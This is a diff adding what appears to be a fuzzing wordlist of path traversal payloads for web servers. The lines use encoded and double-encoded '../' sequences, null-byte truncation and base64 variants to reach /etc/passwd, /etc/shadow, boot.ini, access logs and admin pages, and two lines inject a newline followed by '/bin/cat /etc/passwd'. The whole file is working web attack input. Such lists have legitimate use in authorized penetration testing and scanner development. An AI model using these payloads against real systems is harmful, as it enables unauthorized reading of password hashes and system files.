@@ -1,0 +1,39 @@
+/.../.../.../.../.../
+\…..\\\…..\\\…..\\\
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/../../../../../../../../%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+=3D “/..” . “%2f..
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+admin/access_log
+/admin/install.php
+../../../administrator/inbox
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log
+..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
+L2V0Yy9tYXN0ZXIucGFzc3dk
+L21hc3Rlci5wYXNzd2Q=
+ZXRjL3Bhc3N3ZA==
+ZXRjL3NoYWRvdyUwMA==
+L2V0Yy9wYXNzd2Q=
+L2V0Yy9wYXNzd2QlMDA=
+Li4vZXRjL3Bhc3N3ZA==
+Li4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
